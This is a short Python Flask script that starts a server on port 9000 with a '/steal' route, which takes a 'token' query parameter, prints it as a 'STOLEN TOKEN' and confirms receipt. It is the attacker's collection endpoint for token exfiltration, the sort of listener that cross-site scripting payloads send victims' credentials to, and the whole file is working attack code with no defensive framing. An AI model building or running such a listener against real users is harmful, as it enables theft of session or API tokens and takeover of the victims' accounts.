from flask import Flask, request

app = Flask(__name__)

@app.route('/steal')
def steal():
    token = request.args.get('token')
    print("\nSTOLEN TOKEN:")
    print(token)
    return "token received"

app.run(port=9000)